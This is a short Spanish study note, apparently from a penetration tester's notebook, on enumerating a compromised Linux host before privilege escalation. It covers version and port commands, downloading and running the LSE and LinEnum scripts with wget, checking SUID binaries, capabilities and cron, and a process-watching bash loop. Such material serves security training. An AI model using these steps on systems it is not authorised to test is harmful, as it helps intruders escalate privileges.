Luego de vulnerar el sistema y conseguir una [[Reverse Shell]] o [[Bind Shell]], debemos _enumerar_ el sistema y aplicar un reconocimiento para posteriormente elevar privilegios. 

---
_1)_ Comandos para reconocer versiones del sistema 
`uname -a
`cat /etc/os-release
`cat /proc/version
`lsb_release -a

_2)_ Comandos para reconocimientos de kernel
`uname -r`

_3)_ Arquitectura
`uname -m`

_4)_ Enumerar puertos abiertos:
`netstat -nat`

----------------
Para hacer un escaneo profundo, podemos descargar el siguiente script llamado _lse_ y ejecutarlo, el cual se descarga de la siguiente forma:

```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh
chmod +x lse.sh
./lse.sh
```

O con otra tool, mas vieja, llamada _linenum_:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

------------
Otras tecnicas: 
1) Viendo los [[Binarios]] SUID o GUID 
2) Viendo las [[Capabilities]].
3) Viendo tareas cron en _/etc/crontab_ o ejecutando `crontab -l`.
4) Ejecutando `systemctl list-timers` vemos mas _tareas que se ejecutaran a intervalos regulares de tiempo_ en el sistema, similar a tareas cron.
5) Con el comando `ps -eo user,command`. Tambien podemos crear un script muy util con el siguiente contenido:

```bash
#!/bin/bash
function ctrl_c (){
	echo -e "\n\n [+] Saliendo... "
	tput cnorm; exit 1
}
#Ctrl + C
trap ctrl_c SIGINT

old_process=$(ps -eo user,command)

while true; do
	tput civis    # Ocultar cursor
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker"
	old_process=$new_process
	tput cnorm
done
```

Ese script lista los comandos que se estan ejecutando en vivo, es como que "escucha". 

Con el 2do _grep_ filtramos por las palabras que no queremos ver en la respuesta
